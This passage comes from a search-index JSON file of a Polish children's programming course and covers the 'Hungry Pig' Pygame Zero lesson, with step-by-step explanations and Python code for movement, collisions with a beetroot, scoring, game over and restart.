Tworzymy aktora \u015bwini\npig = Actor(\"pig_down\")\n# Okre\u015blamy pocz\u0105tkow\u0105 pozycj\u0119 \u015bwini na ekranie\npig.x = WIDTH / 2\npig.y = HEIGHT / 2\n# Okre\u015blamy pocz\u0105tkow\u0105 pr\u0119dko\u015b\u0107 poziom\u0105 i pionow\u0105 \u015bwini\npig.vx = 0\npig.vy = 0\n# Okre\u015blamy pocz\u0105tkow\u0105 pr\u0119dko\u015b\u0107 g\u0142\u00f3wn\u0105 \u015bwini\npig.v = 3\n\ndef draw():\n    screen.blit(\"bg\", (0, 0))\n    # Rysujemy \u015bwini\u0119\n    pig.draw()\n\ndef update():\n    # Przemieszczamy \u015bwini\u0119 zgodnie z jej pr\u0119dko\u015bci\u0105 w poziomie i pionie\n    pig.x += pig.vx\n    pig.y += pig.vy\n\n# Funkcja odczytuj\u0105ca klikni\u0119cia klawiszy na klawiaturze\ndef on_key_down(key):\n    # Sprawdzamy, czy naci\u015bni\u0119to klawisz strza\u0142ki w lewo\n    if key == keys.LEFT:\n        # Zmieniamy pr\u0119dko\u015b\u0107 \u015bwini\n        pig.vx = -pig.v\n        pig.vy = 0\n        # Zmieniamy grafik\u0119 \u015bwini\n        pig.image = \"pig_left\"\n\n    # Sprawdzamy, czy naci\u015bni\u0119to klawisz strza\u0142ki w prawo\n    if key == keys.RIGHT:\n        pig.vx = pig.v\n        pig.vy = 0\n        pig.image = \"pig_right\"\n\n    # Sprawdzamy, czy naci\u015bni\u0119to klawisz strza\u0142ki w g\u00f3r\u0119\n    if key == keys.UP:\n        pig.vx = 0\n        pig.vy = -pig.v\n        pig.image = \"pig_up\"\n\n    # Sprawdzamy, czy naci\u015bni\u0119to klawisz strza\u0142ki w d\u00f3\u0142\n    if key == keys.DOWN:\n        pig.vx = 0\n        pig.vy = pig.v\n        pig.image = \"pig_down\"\n\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#buraki","title":"Buraki","text":"<p>Nasza \u015bwinia b\u0119dzie \u017cywi\u0107 si\u0119 burakami. Na ekranie zawsze b\u0119dzie dok\u0142adnie jeden burak. Gdy \u015bwinia zje buraka, ten pojawi si\u0119 ponownie w nowym, losowym miejscu na ekranie.</p>"},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#dodajemy-aktora_1","title":"Dodajemy aktora","text":"<p>Naszego aktora zapiszemy w zmiennej <code>beet</code>. Utworzymy go na podstawie grafiki beetroot.png i pocz\u0105tkowo umie\u015bcimy w dowolnym miejscu na ekranie, np. pod wsp\u00f3\u0142rz\u0119dnymi \\((200, 200)\\).</p> <pre><code>beet = Actor(\"beetroot\")\nbeet.x = 200\nbeet.y = 200\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#rysujemy-buraka-na-ekranie","title":"Rysujemy buraka na ekranie","text":"<p>W cz\u0119\u015bci rysuj\u0105cej dopisujemy instrukcj\u0119, kt\u00f3ra wy\u015bwietli naszego nowego aktora na ekranie: <code>beet.draw()</code>.</p> <pre><code>def draw():\n    ...\n\n    beet.draw()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#zjadanie-burakow","title":"Zjadanie burak\u00f3w","text":"<p>Podczas poruszania si\u0119 po ekranie, gdy \u015bwinia wejdzie w kolizj\u0119 z burakiem, to go zje. Po zjedzeniu buraka \u015bwinia powinna przyspieszy\u0107, wyda\u0107 odpowiedni odg\u0142os, a sam burak powinien przemie\u015bci\u0107 si\u0119 w losowe miejsce na ekranie.</p> <p>Wszystko b\u0119dziemy zapisywa\u0107 w cz\u0119\u015bci aktualizuj\u0105cej update, zaraz pod zmian\u0105 pozycji \u015bwini.</p> <p>W celu stwierdzenia, \u017ce \u015bwinia jest w kolizji z burakiem, skorzystamy z instrukcji colliderect:</p> <pre><code>def update():\n    ...\n\n    if pig.colliderect(beet):\n</code></pre> <p>Po wykryciu kolizji zacznijmy od przemieszczenia buraka w losowe miejsce. Osobno wylosujemy nowe warto\u015bci dla wsp\u00f3\u0142rz\u0119dnych \\(x\\) oraz \\(y\\). Aby jednak burak nie pojawi\u0142 si\u0119 na brzegu ekranu, warto zadba\u0107 o odpowiedni margines, np \\(50\\) pikseli. W celu wylosowania warto\u015bci skorzystamy z biblioteki random oraz funkcji randint, do kt\u00f3rej, jako argumenty, przekazujemy przedzia\u0142, z jakiego chcemy wylosowa\u0107 warto\u015b\u0107.</p> <pre><code>def update():\n    ...\n\n    if pig.colliderect(beet):\n        beet.x = random.randint(50, WIDTH - 50)\n        beet.y = random.randint(50, HEIGHT - 50)\n</code></pre> <p>Nast\u0119pnie zwi\u0119kszamy pr\u0119dko\u015b\u0107 \u015bwini. W tym celu modyfikujemy parametr v, dodaj\u0105c do niego jak\u0105\u015b niewielk\u0105 liczb\u0119, np. \\(0.8\\). Warto poeksperymentowa\u0107 z r\u00f3\u017cnymi warto\u015bciami by dobra\u0107 odpowiedni dla siebie poziom trudno\u015bci.</p> <pre><code>def update():\n    ...\n\n    if pig.colliderect(beet):\n        beet.x = random.randint(50, WIDTH - 50)\n        beet.y = random.randint(50, HEIGHT - 50)\n        pig.v += 0.8\n</code></pre> <p>Na koniec warto jeszcze doda\u0107 efekty d\u017awi\u0119kowe. W tym celu piszemy <code>sounds.</code>, nast\u0119pnie nazwa pliku z d\u017awi\u0119kiem znajduj\u0105cego si\u0119 w katalogu sounds, np. <code>sounds.pig</code>, a na koniec, po kolejnej kropce, polecenie <code>play()</code>.</p> <pre><code>def update():\n    ...\n\n    if pig.colliderect(beet):\n        beet.x = random.randint(50, WIDTH - 50)\n        beet.y = random.randint(50, HEIGHT - 50)\n        pig.v += 0.8\n        sounds.pig.play()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#peny-kod_1","title":"Pe\u0142ny kod","text":"<pre><code>import pgzrun\nimport random\n\nWIDTH = 800\nHEIGHT = 800\n\nTITLE = \"Pygame Zero Hungry Pig\"\n\npig = Actor(\"pig_down\")\npig.x = 400\npig.y = 400\npig.vx = 0\npig.vy = 0\npig.v = 3\n\n# Tworzymy aktora buraka\nbeet = Actor(\"beetroot\")\n# Okre\u015blamy pocz\u0105tkowe po\u0142o\u017cenie buraka na ekranie\nbeet.x = 200\nbeet.y = 200\n\ndef draw():\n    screen.blit(\"bg\", (0, 0))\n    pig.draw()\n    # Rysujemy buraka\n    beet.draw()\n\ndef update():\n    pig.x += pig.vx\n    pig.y += pig.vy\n\n    # Je\u017celi \u015bwinia wpad\u0142a na buraka\n    if pig.colliderect(beet):\n        # Przemieszczamy buraka w nowe, losowe miejsce na ekranie\n        beet.x = random.randint(50, WIDTH - 50)\n        beet.y = random.randint(50, HEIGHT - 50)\n        # Przyspieszamy \u015bwini\u0119\n        pig.v += 0.8\n        # Odgrywamy d\u017awi\u0119k \u015bwini\n        sounds.pig.play()\n\ndef on_key_down(key):\n    if key == keys.LEFT:\n        pig.vx = -pig.v\n        pig.vy = 0\n        pig.image = \"pig_left\"\n\n    if key == keys.RIGHT:\n        pig.vx = pig.v\n        pig.vy = 0\n        pig.image = \"pig_right\"\n\n    if key == keys.UP:\n        pig.vx = 0\n        pig.vy = -pig.v\n        pig.image = \"pig_up\"\n\n    if key == keys.DOWN:\n        pig.vx = 0\n        pig.vy = pig.v\n        pig.image = \"pig_down\"\n\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#punkty","title":"Punkty","text":"<p>C\u00f3\u017c to za gra bez punkt\u00f3w! Dodanie jednak punkt\u00f3w do naszej gry to \u017caden problem. Punkty b\u0119dziemy dostawa\u0107 za ka\u017cdego zjedzonego buraka. Na pocz\u0105tku dopisujemy punkty w postaci nowej zmiennej points do naszej \u015bwini. Pocz\u0105tkowo punkty ustawiamy na \\(0\\). Now\u0105 warto\u015b\u0107 dopisujemy zaraz pod ustaleniem g\u0142\u00f3wnej pr\u0119dko\u015bci \u015bwini.</p> <pre><code>pig.points = 0\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#wyswietlamy-punkty","title":"Wy\u015bwietlamy punkty","text":"<p>Zanim przejdziemy do zliczania punkt\u00f3w, wy\u015bwietlmy je na ekranie gry. W tym celu, na ko\u0144cu cz\u0119\u015bci rysuj\u0105cej draw, dopisujemy polecenie <code>screen.draw.text</code>. Jako parametry podamy tekst do wy\u015bwietlenia, czyli nasze punkty zamienione na tekst, a tak\u017ce pozycj\u0119 \u015brodka tekstu na ekranie (center), rozmiar czcionki (fontsize), kolor tekstu (color) oraz nazw\u0119 czcionki (fontname). Czcionka, z kt\u00f3rej chcemy skorzysta\u0107, musi znajdowa\u0107 si\u0119 w katalogu fonts.</p> <pre><code>def draw():\n    ...\n\n    screen.draw.text(f\"{pig.points}\", center=(WIDTH / 2, 50), fontsize=60, color=\"#fdee00\", fontname=\"kenney_bold\")\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#zliczamy-punkty","title":"Zliczamy punkty","text":"<p>Jak ju\u017c ustalili\u015bmy, punkty b\u0119dziemy dostawa\u0107 za ka\u017cdego zjedzonego buraka. W takim razie, do cz\u0119\u015bci, w kt\u00f3rej wykrywamy kolizj\u0119 z burakiem, dopisujemy zwi\u0119kszanie punkt\u00f3w: <code>pig.points += 1</code>. Warto to dopisa\u0107 zaraz pod zwi\u0119kszeniem pr\u0119dko\u015bci \u015bwini, tak aby zachowa\u0107 czytelno\u015b\u0107 kodu, ale kolejno\u015b\u0107 nie ma du\u017cego znaczenia. R\u00f3wnie dobrze mogliby\u015bmy t\u0119 linijk\u0119 dopisa\u0107 po wywo\u0142aniu d\u017awi\u0119ku \u015bwini.</p> <pre><code>def update():\n    ...\n\n    if pig.colliderect(beet):\n        beet.x = random.randint(50, WIDTH - 50)\n        beet.y = random.randint(50, HEIGHT - 50)\n        pig.v += 0.8\n        pig.points += 1\n        sounds.pig.play()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#peny-kod_2","title":"Pe\u0142ny kod","text":"<pre><code>import pgzrun\nimport random\n\nWIDTH = 800\nHEIGHT = 800\n\nTITLE = \"Pygame Zero Hungry Pig\"\n\npig = Actor(\"pig_down\")\npig.x = 400\npig.y = 400\npig.vx = 0\npig.vy = 0\npig.v = 3\n# Okre\u015blamy pocz\u0105tkow\u0105 liczb\u0119 punkt\u00f3w gracza\npig.points = 0\n\nbeet = Actor(\"beetroot\")\nbeet.x = 200\nbeet.y = 200\n\ndef draw():\n    screen.blit(\"bg\", (0, 0))\n    pig.draw()\n    beet.draw()\n    # Wypisujemy liczb\u0119 zdobytych punkt\u00f3w\n    screen.draw.text(f\"{pig.points}\", center=(WIDTH / 2, 50), fontsize=60, color=\"#fdee00\", fontname=\"kenney_bold\")\n\ndef update():\n    pig.x += pig.vx\n    pig.y += pig.vy\n\n    if pig.colliderect(beet):\n        beet.x = random.randint(50, WIDTH - 50)\n        beet.y = random.randint(50, HEIGHT - 50)\n        pig.v += 0.8\n        # Zwi\u0119kszamy liczb\u0119 punkt\u00f3w\n        pig.points += 1\n        sounds.pig.play()\n\ndef on_key_down(key):\n    if key == keys.LEFT:\n        pig.vx = -pig.v\n        pig.vy = 0\n        pig.image = \"pig_left\"\n\n    if key == keys.RIGHT:\n        pig.vx = pig.v\n        pig.vy = 0\n        pig.image = \"pig_right\"\n\n    if key == keys.UP:\n        pig.vx = 0\n        pig.vy = -pig.v\n        pig.image = \"pig_up\"\n\n    if key == keys.DOWN:\n        pig.vx = 0\n        pig.vy = pig.v\n        pig.image = \"pig_down\"\n\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#koniec-gry","title":"Koniec gry","text":"<p>C\u00f3\u017c to za gra, kt\u00f3ra si\u0119 nie ko\u0144czy? Nasza gra b\u0119dzie ko\u0144czy\u0107 si\u0119, gdy \u015bwinia wyjdzie poza ekran. W celu zapami\u0119tania, \u017ce gra si\u0119 ju\u017c zako\u0144czy\u0142a, dopiszemy do \u015bwini now\u0105 zmienn\u0105 dead, kt\u00f3r\u0105 na pocz\u0105tku ustawimy na warto\u015b\u0107 False. Now\u0105 warto\u015b\u0107 dopisujemy zaraz pod przypisaniem do \u015bwini liczby punkt\u00f3w.</p> <pre><code>pig.dead = False\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#wyswietlamy-komunikat","title":"Wy\u015bwietlamy komunikat","text":"<p>Zacznijmy od wy\u015bwietlenia na ekranie komunikatu o zako\u0144czeniu gry. W cz\u0119\u015bci rysuj\u0105cej, na samym ko\u0144cu, sprawdzimy, czy gra jest zako\u0144czona, tzn. czy zmienna <code>pig.dead</code> ma warto\u015b\u0107 True. </p> <pre><code>def draw():\n    ...\n\n    if pig.dead:\n</code></pre> <p>Je\u017celi tak jest, to wy\u015bwietlimy na ekranie komunikat GAME OVER.</p> <pre><code>def draw():\n    ...\n\n    if pig.dead:\n        screen.draw.text(f\"GAME OVER\", center=(WIDTH / 2, HEIGHT / 2), fontsize=70, color=\"#e30022\", fontname=\"kenney_bold\")\n</code></pre> <p>Warto przetestowa\u0107, czy komunikat wy\u015bwietla si\u0119 poprawnie, tymczasowo zmieniaj\u0105c warto\u015b\u0107 zmiennej <code>pig.dead</code> na True.</p>"},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#sprawdzamy-wyjscie-poza-ekran","title":"Sprawdzamy wyj\u015bcie poza ekran","text":"<p>Nasza gra si\u0119 ko\u0144czy, gdy \u015bwinia wyjdzie poza ekran gry. Aby sprawdzi\u0107, czy tak si\u0119 sta\u0142o, wystarczy sprawdzi\u0107 warto\u015bci wsp\u00f3\u0142rz\u0119dnych naszej \u015bwini. Je\u017celi s\u0105 mniejsze od zera, albo wi\u0119ksze od odpowiednio szeroko\u015bci i wysoko\u015bci, to znaczy, \u017ce \u015bwinia wysz\u0142a poza ekran. Dopisujemy wi\u0119c odpowiedni warunek na koniec cz\u0119\u015bci aktualizuj\u0105cej.</p> <pre><code>def update():\n    ...\n\n    if pig.x &lt; 0 or pig.x &gt; WIDTH or pig.y &lt; 0 or pig.y &gt; HEIGHT:\n</code></pre> <p>Gdy \u015bwinia wyjdzie poza ekran to gra si\u0119 ko\u0144czy, ustawiamy wi\u0119c zmienn\u0105 <code>pig.dead</code> na warto\u015b\u0107 True.</p> <pre><code>def update():\n    ...\n\n    if pig.x &lt; 0 or pig.x &gt; WIDTH or pig.y &lt; 0 or pig.y &gt; HEIGHT:\n        pig.dead = True\n</code></pre> <p>Dla lepszego efektu mo\u017cemy tak\u017ce przemie\u015bci\u0107 \u015bwini\u0119 zaraz nad napis GAME OVER i zmieni\u0107 jej grafik\u0119 na pig_dead.png.</p> <pre><code>def update():\n    ...\n\n    if pig.x &lt; 0 or pig.x &gt; WIDTH or pig.y &lt; 0 or pig.y &gt; HEIGHT:\n        pig.dead = True\n        pig.x = WIDTH / 2\n        pig.y = HEIGHT / 3\n        pig.image = \"pig_dead\"\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#zamrozenie-rozgrywki","title":"Zamro\u017cenie rozgrywki","text":"<p>Gdy teraz przetestujemy nasz\u0105 gr\u0119, to zauwa\u017cymy, \u017ce rozgrywka dalej si\u0119 toczy po zako\u0144czeniu gry, tzn. dalej mo\u017cna porusza\u0107 \u015bwini\u0105 i zjada\u0107 buraki. Oczywi\u015bcie nie chcemy, by tak si\u0119 dzia\u0142o. W tym celu nale\u017cy dopisa\u0107 prost\u0105 instrukcj\u0119 warunkow\u0105 na pocz\u0105tek cz\u0119\u015bci aktualizuj\u0105cej, a tak\u017ce na pocz\u0105tek cz\u0119\u015bci odpowiedzialnej za odczytywanie klikni\u0119tych przycisk\u00f3w z klawiatury.</p> <pre><code>def update():\n    if pig.dead:\n        return\n\n    ...\n</code></pre> <pre><code>def on_key_down(key):\n    if pig.dead:\n        return\n\n    ...\n</code></pre> <p>Dzi\u0119ki temu, je\u017celi gra jest ju\u017c zako\u0144czona, to \u017cadne dalsze instrukcje w danej cz\u0119\u015bci nie b\u0119d\u0105 ju\u017c wykonywane.</p>"},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#peny-kod_3","title":"Pe\u0142ny kod","text":"<pre><code>import pgzrun\nimport random\n\nWIDTH = 800\nHEIGHT = 800\n\nTITLE = \"Pygame Zero Hungry Pig\"\n\npig = Actor(\"pig_down\")\npig.x = WIDTH / 2\npig.y = HEIGHT / 2\npig.vx = 0\npig.vy = 0\npig.v = 3\npig.points = 0\n# Zapami\u0119tujemy, czy gra si\u0119 zako\u0144\u0107zy\u0142a\npig.dead = False\n\nbeet = Actor(\"beetroot\")\nbeet.x = 200\nbeet.y = 200\n\ndef draw():\n    screen.blit(\"bg\", (0, 0))\n    pig.draw()\n    beet.draw()\n    screen.draw.text(f\"{pig.points}\", center=(WIDTH / 2, 50), fontsize=60, color=\"#fdee00\", fontname=\"kenney_bold\")\n    # Je\u017celi gra si\u0119 zako\u0144czy\u0142a\n    if pig.dead:\n        # Wypisujemy komunikat o zako\u0144czeniu gry\n        screen.draw.text(f\"GAME OVER\", center=(WIDTH / 2, HEIGHT / 2), fontsize=70, color=\"#e30022\", fontname=\"kenney_bold\")\n\ndef update():\n    # Je\u017celi gra si\u0119 zako\u0144\u0107zy\u0142a\n    if pig.dead:\n        # To nie aktualizujemy ju\u017c element\u00f3w naszej gry\n        return\n\n    pig.x += pig.vx\n    pig.y += pig.vy\n\n    if pig.colliderect(beet):\n        beet.x = random.randint(50, WIDTH - 50)\n        beet.y = random.randint(50, HEIGHT - 50)\n        pig.v += 0.8\n        pig.points += 1\n        sounds.pig.play()\n\n    # Je\u017celi \u015bwinia wypad\u0142a poza ekran\n    if pig.x &lt; 0 or pig.x &gt; WIDTH or pig.y &lt; 0 or pig.y &gt; HEIGHT:\n        # Zapami\u0119tujemy, \u017ce gra si\u0119 zako\u0144czy\u0142a\n        pig.dead = True\n        # Zmieniamy pozycj\u0119 \u015bwini\n        pig.x = WIDTH / 2\n        pig.y = HEIGHT / 3\n        # Zmieniamy grafik\u0119 \u015bwini\n        pig.image = \"pig_dead\"\n\ndef on_key_down(key):\n    # Je\u017celi gra si\u0119 zako\u0144czy\u0142a\n    if pig.dead:\n        # Ko\u0144czymy, aby nie mo\u017cna ju\u017c by\u0142o porusza\u0107 \u015bwini\u0105\n        return\n\n    if key == keys.LEFT:\n        pig.vx = -pig.v\n        pig.vy = 0\n        pig.image = \"pig_left\"\n\n    if key == keys.RIGHT:\n        pig.vx = pig.v\n        pig.vy = 0\n        pig.image = \"pig_right\"\n\n    if key == keys.UP:\n        pig.vx = 0\n        pig.vy = -pig.v\n        pig.image = \"pig_up\"\n\n    if key == keys.DOWN:\n        pig.vx = 0\n        pig.vy = pig.v\n        pig.image = \"pig_down\"\n\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#restart-gry","title":"Restart gry","text":"<p>Warto doda\u0107 do naszej gry mo\u017cliwo\u015b\u0107 rozpocz\u0119cia ponownej rozgrywki, gdy gra ju\u017c si\u0119 zako\u0144czy. W ten spos\u00f3b nie b\u0119dziemy musieli wy\u0142\u0105cza\u0107 i ponownie w\u0142\u0105cza\u0107 okna gry. Zacznijmy od dodania pomocniczej funkcji restart, za pomoc\u0105 kt\u00f3rej przywr\u00f3cimy pocz\u0105tkowe ustawienia, takie jak: grafik\u0119 \u015bwini, pozycj\u0119 \u015bwini, pr\u0119dko\u015b\u0107 \u015bwini, punkty oraz stan gry. Funkcj\u0119 dopisujemy na samym dole, zaraz przed instrukcj\u0105 <code>pgzrun.go()</code>.</p> <pre><code>def restart():\n    pig.image = \"pig_down\"\n    pig.x = 400\n    pig.y = 400\n    pig.vx = 0\n    pig.vy = 0\n    pig.v = 3\n    pig.points = 0\n    pig.dead = False\n</code></pre> <p>Teraz pozostaje pytanie: kiedy i w jaki spos\u00f3b restartowa\u0107 gr\u0119? Chcemy, aby gracz m\u00f3g\u0142 zrestartowa\u0107 rozgrywk\u0119 zaraz po jej zako\u0144czeniu. Powiedzmy, \u017ce jak gra si\u0119 ju\u017c zako\u0144czy\u0142a i gracz naci\u015bnie spacj\u0119, to rozpocznie si\u0119 kolejna rozgrywka. Dopiszmy wi\u0119c stosown\u0105 instrukcj\u0119 do funkcji <code>on_key_down</code>.</p> <pre><code>def on_key_down(key):\n    if pig.dead:\n        if key == keys.SPACE:\n            restart()\n\n        return\n</code></pre> <p>Teraz mo\u017cemy ju\u017c restartowa\u0107 nasz\u0105 rozgrywk\u0119. Warto jeszcze wy\u015bwietli\u0107 dodatkowy komunikat po zako\u0144czeniu gry. W cz\u0119\u015bci rysuj\u0105cej, zaraz pod komunikatem \"GAME OVER\", dopisujemy:</p> <pre><code>screen.draw.text(f\"Press SPACE to try again\", center=(WIDTH / 2, 2 * HEIGHT / 3), fontsize=30, color=\"#e30022\", fontname=\"kenney_bold\")\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#peny-kod_4","title":"Pe\u0142ny kod","text":"<pre><code>import pgzrun\nimport random\n\nWIDTH = 800\nHEIGHT = 800\n\nTITLE = \"Pygame Zero Hungry Pig\"\n\npig = Actor(\"pig_down\")\npig.x = WIDTH / 2\npig.y = HEIGHT / 2\npig.vx = 0\npig.vy = 0\npig.v = 3\npig.points = 0\npig.dead = False\n\nbeet = Actor(\"beetroot\")\nbeet.x = 200\nbeet.y = 200\n\ndef draw():\n    screen.blit(\"bg\", (0, 0))\n    pig.draw()\n    beet.draw()\n    screen.draw.text(f\"{pig.points}\", center=(WIDTH / 2, 50), fontsize=60, color=\"#fdee00\", fontname=\"kenney_bold\")\n    if pig.dead:\n        screen.draw.text(f\"GAME OVER\", center=(WIDTH / 2, HEIGHT / 2), fontsize=70, color=\"#e30022\", fontname=\"kenney_bold\")\n        # Wypisujemy komunikat o mo\u017cliwo\u015bci ponownego rozpocz\u0119cia rozgrywki\n        screen.draw.text(f\"Press SPACE to try again\", center=(WIDTH / 2, 2 * HEIGHT / 3), fontsize=30, color=\"#e30022\", fontname=\"kenney_bold\")\n\ndef update():\n    if pig.dead:\n        return\n\n    pig.x += pig.vx\n    pig.y += pig.vy\n\n    if pig.colliderect(beet):\n        beet.x = random.randint(50, WIDTH - 50)\n        beet.y = random.randint(50, HEIGHT - 50)\n        pig.v += 0.8\n        pig.points += 1\n        sounds.pig.play()\n\n    if pig.x &lt; 0 or pig.x &gt; WIDTH or pig.y &lt; 0 or pig.y &gt; HEIGHT:\n        pig.dead = True\n        pig.x = WIDTH / 2\n        pig.y = HEIGHT / 3\n        pig.image = \"pig_dead\"\n\ndef on_key_down(key):\n    if pig.dead:\n        # Sprawdzamy, czy naci\u015bni\u0119to przycisk spacji\n        if key == keys.SPACE:\n            # Restartujemy gr\u0119\n            restart()\n\n        return\n\n    if key == keys.LEFT:\n        pig.vx = -pig.v\n        pig.vy = 0\n        pig.image = \"pig_left\"\n\n    if key == keys.RIGHT:\n        pig.vx = pig.v\n        pig.vy = 0\n        pig.image = \"pig_right\"\n\n    if key == keys.UP:\n        pig.vx = 0\n        pig.vy = -pig.v\n        pig.image = \"pig_up\"\n\n    if key == keys.DOWN:\n        pig.vx = 0\n        pig.vy = pig.v\n        pig.image = \"pig_down\"\n\n# Funkcja restartuj\u0105ca gr\u0119\ndef restart():\n    # Ustawiamy pocz\u0105tkow\u0105 grafik\u0119 \u015bwini\n    pig.image = \"pig_down\"\n    # Ustawiamy pocz\u0105tkow\u0105 pozycj\u0119 \u015bwini na ekranie\n    pig.x = WIDTH / 2\n    pig.y = HEIGHT / 2\n    # Ustawiamy pocz\u0105tkow\u0105 pr\u0119dko\u015b\u0107 poziom\u0105 i pionow\u0105 \u015bwini\n    pig.vx = 0\n    pig.vy = 0\n    # Ustawiamy pocz\u0105tkow\u0105 pr\u0119dko\u015b\u0107 g\u0142\u00f3wn\u0105 \u015bwini\n    pig.v = 3\n    # Ustawiamy pocz\u0105tkow\u0105 liczb\u0119 punkt\u00f3w\n    pig.points = 0\n    # Zapami\u0119tujemy, czy gra si\u0119 zako\u0144czy\u0142a\n    pig.dead = False\n\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#czyszczenie","title":"Czyszczenie","text":"<p>Na koniec warto przyjrze\u0107 si\u0119 naszemu kodowi i zastanowi\u0107 si\u0119, czy nie mo\u017cemy czego\u015b upro\u015bci\u0107, albo skr\u00f3ci\u0107. Jak spojrzymy na to, jak tworzymy aktora \u015bwini i na to, jak wygl\u0105da nasza funkcja restartuj\u0105ca gr\u0119, to zobaczymy wiele podobie\u0144stw. Naturalnym jest, \u017ce przy restarcie gry b\u0119dziemy ustawia\u0107 takie same parametry \u015bwini jak na pocz\u0105tku gry! W zwi\u0105zku z tym mo\u017cemy oczy\u015bci\u0107 nasz kod usuwaj\u0105c zb\u0119dne powt\u00f3rzenia. Z pocz\u0105tku kodu usuwamy instrukcje przypisuj\u0105ce parametry do \u015bwini, od instrukcji <code>pig.x = WIDTH / 2</code> po instrukcj\u0119 <code>pig.dead = False</code>. Teraz pozosta\u0142o nam wywo\u0142a\u0107 nasz\u0105 funkcj\u0119 restart zaraz przed uruchomieniem gry, czyli zaraz przed linijk\u0105 <code>pgzrun.go()</code>.</p> <pre><code>...\n\nrestart()\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#peny-kod_5","title":"Pe\u0142ny kod","text":"<pre><code>import pgzrun\nimport random\n\nWIDTH = 800\nHEIGHT = 800\n\nTITLE = \"Pygame Zero Hungry Pig\"\n\npig = Actor(\"pig_down\")\n\nbeet = Actor(\"beetroot\")\nbeet.x = 200\nbeet.y = 200\n\ndef draw():\n    screen.blit(\"bg\", (0, 0))\n    pig.draw()\n    beet.draw()\n    screen.draw.text(f\"{pig.points}\", center=(WIDTH / 2, 50), fontsize=60, color=\"#fdee00\", fontname=\"kenney_bold\")\n    if pig.dead:\n        screen.draw.text(f\"GAME OVER\", center=(WIDTH / 2, HEIGHT / 2), fontsize=70, color=\"#e30022\", fontname=\"kenney_bold\")\n        screen.draw.text(f\"Press SPACE to try again\", center=(WIDTH / 2, 2 * HEIGHT / 3), fontsize=30, color=\"#e30022\", fontname=\"kenney_bold\")\n\ndef update():\n    if pig.dead:\n        return\n\n    pig.x += pig.vx\n    pig.y += pig.vy\n\n    if pig.colliderect(beet):\n        beet.x = random.randint(50, WIDTH - 50)\n        beet.y = random.randint(50, HEIGHT - 50)\n        pig.v += 0.8\n        pig.points += 1\n        sounds.pig.play()\n\n    if pig.x &lt; 0 or pig.x &gt; WIDTH or pig.y &lt; 0 or pig.y &gt; HEIGHT:\n        pig.dead = True\n        pig.x = WIDTH / 2\n        pig.y = HEIGHT / 3\n        pig.image = \"pig_dead\"\n\ndef on_key_down(key):\n    if pig.dead:\n        if key == keys.SPACE:\n            restart()\n\n        return\n\n    if key == keys.LEFT:\n        pig.vx = -pig.v\n        pig.vy = 0\n        pig.image = \"pig_left\"\n\n    if key == keys.RIGHT:\n        pig.vx = pig.v\n        pig.vy = 0\n        pig.image = \"pig_right\"\n\n    if key == keys.UP:\n        pig.vx = 0\n        pig.vy = -pig.v\n        pig.image = \"pig_up\"\n\n    if key == keys.DOWN:\n        pig.vx = 0\n        pig.vy = pig.v\n        pig.image = \"pig_down\"\n\ndef restart():\n    pig.image = \"pig_down\"\n    pig.x = WIDTH / 2\n    pig.y = HEIGHT / 2\n    pig.vx = 0\n    pig.vy = 0\n    pig.v = 3\n    pig.points = 0\n    pig.dead = False\n\n# Wywo\u0142ujemy funkcj\u0119 restart, aby ustawi\u0107 pocz\u0105tkowe parametry naszej gry\nrestart()\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#pena-gra","title":"Pe\u0142na gra","text":"<pre><code># Importujemy potrzebne biblioteki\nimport pgzrun\nimport random\n\n# Okre\u015blamy szeroko\u015b\u0107 i wysoko\u015b\u0107 okna gry\nWIDTH = 800\nHEIGHT = 800\n\n# Podajemy tytu\u0142 okna naszej gry\nTITLE = \"Pygame Zero Hungry Pig\"\n\n# Tworzymy aktora \u015bwini\npig = Actor(\"pig_down\")\n\n# Tworzymy aktora buraka\nbeet = Actor(\"beetroot\")\n# Okre\u015blamy pocz\u0105tkowe po\u0142o\u017cenie buraka na ekranie\nbeet.x = 200\nbeet.y = 200\n\n# Funkcja rysuj\u0105ca stan gry na ekranie\ndef draw():\n    # Wy\u015bwietlamy t\u0142o\n    screen.blit(\"bg\", (0, 0))\n    # Rysujemy \u015bwini\u0119\n    pig.draw()\n    # Rysujemy buraka\n    beet.draw()\n    # Wypisujemy liczb\u0119 zdobytych punkt\u00f3w\n    screen.draw.text(f\"{pig.points}\", center=(WIDTH / 2, 50), fontsize=60, color=\"#fdee00\", fontname=\"kenney_bold\")\n    # Je\u017celi gra si\u0119 zako\u0144czy\u0142a\n    if pig.dead:\n        # Wypisujemy komunikat o zako\u0144czeniu gry\n        screen.draw.text(f\"GAME OVER\", center=(WIDTH / 2, HEIGHT / 2), fontsize=70, color=\"#e30022\", fontname=\"kenney_bold\")\n        # Wypisujemy komunikat o mo\u017cliwo\u015bci ponownego rozpocz\u0119cia rozgrywki\n        screen.draw.text(f\"Press SPACE to try again\", center=(WIDTH / 2, 2 * HEIGHT / 3), fontsize=30, color=\"#e30022\", fontname=\"kenney_bold\")\n\n# Funkcja aktualizuj\u0105ca stan gry\ndef update():\n    # Je\u017celi gra si\u0119 zako\u0144\u0107zy\u0142a\n    if pig.dead:\n        # To nie aktualizujemy ju\u017c element\u00f3w naszej gry\n        return\n\n    # Przemieszczamy \u015bwini\u0119 